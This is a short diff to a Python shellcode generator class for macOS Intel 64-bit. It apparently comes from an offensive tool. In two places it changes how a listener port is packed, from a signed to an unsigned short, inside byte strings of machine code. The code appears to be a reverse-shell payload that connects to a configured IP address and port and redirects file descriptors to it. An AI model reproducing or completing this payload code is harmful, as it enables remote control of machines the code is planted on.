@@ -73,7 +73,7 @@ class macho_intel64_shellcode():
                            "\x00\x02"
                            )
 
-        self.shellcode2 += struct.pack(">h", self.PORT)
+        self.shellcode2 += struct.pack(">H", self.PORT)
         self.shellcode2 += self.pack_ip_addresses()
         self.shellcode2 += ("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                             "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
@@ -114,7 +114,7 @@ class macho_intel64_shellcode():
                             "\x89\xc4\x48\x89\xc7\xb8\x62\x00\x00\x02\x48\x31\xf6\x56\x48\xbe"
                             "\x00\x02"
                             )
-        self.shellcode2 += struct.pack(">h", self.PORT)
+        self.shellcode2 += struct.pack(">H", self.PORT)
         self.shellcode2 += self.pack_ip_addresses()
         self.shellcode2 += ("\x56\x48\x89\xe6\x6a\x10\x5a\x0f"
                             "\x05\x4c\x89\xe7\xb8\x5a\x00\x00\x02\x48\x31\xf6\x0f\x05\xb8\x5a"
